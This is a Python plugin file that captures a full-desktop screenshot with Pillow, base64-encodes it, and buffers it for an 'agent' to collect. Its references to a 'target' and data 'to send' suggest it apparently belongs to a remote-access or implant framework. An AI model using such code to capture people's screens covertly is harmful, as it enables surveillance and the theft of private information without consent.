import base64
import datetime
import io
from typing import List, Dict, Any

from .base_plugin import BasePlugin

# Attempt to import Pillow, which is needed for screenshots.
try:
    from PIL import ImageGrab
    PILLOW_AVAILABLE = True
except ImportError:
    PILLOW_AVAILABLE = False


class ScreenshotPlugin(BasePlugin):
    """
    A plugin to capture a screenshot of the entire desktop.
    """

    def __init__(self):
        self._data_buffer: List[Dict[str, Any]] = []

    def get_name(self) -> str:
        return "screenshot"

    def start(self, agent, args: Dict[str, Any]):
        """Takes a screenshot, base64 encodes it, and stores it in the buffer."""
        print("Starting screenshot plugin...")

        screenshot_b64 = ""
        error_message = ""

        if not PILLOW_AVAILABLE:
            error_message = "Pillow library not installed on target."
        else:
            try:
                # Grab the screenshot
                screenshot = ImageGrab.grab()

                # Save the image to an in-memory buffer
                buffer = io.BytesIO()
                screenshot.save(buffer, format="PNG")

                # Encode the image bytes as a base64 string
                screenshot_b64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                print("Screenshot captured successfully.")

            except Exception as e:
                # This will likely fail in a headless environment (like the test sandbox)
                error_message = f"Failed to capture screenshot: {e}"
                print(error_message)

        # Create a data entry, either with the screenshot or the error message
        data_entry = {
            "timestamp_utc": datetime.datetime.utcnow().isoformat(),
            "log_type": "screenshot_capture",
            "content": {
                "screenshot_b64": screenshot_b64,
                "error": error_message
            }
        }
        self._data_buffer.append(data_entry)

    def stop(self):
        pass

    def get_data(self) -> List[Dict[str, Any]]:
        """Returns the collected screenshot and clears the buffer."""
        data_to_send = list(self._data_buffer)
        self._data_buffer.clear()
        return data_to_send
